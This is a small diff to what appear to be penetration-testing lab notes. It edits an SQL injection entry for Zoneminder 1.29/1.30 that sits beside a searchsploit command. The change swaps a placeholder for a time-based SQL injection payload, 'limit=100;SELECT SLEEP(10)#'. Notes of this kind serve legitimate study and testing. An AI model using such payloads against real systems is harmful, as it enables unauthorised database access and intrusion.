@@ -243,7 +243,7 @@ Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation /
 
 # sql injection
 searchsploit -m 41239
-;'
+limit=100;SELECT SLEEP(10)#
 
 ```
 ### Nibbles
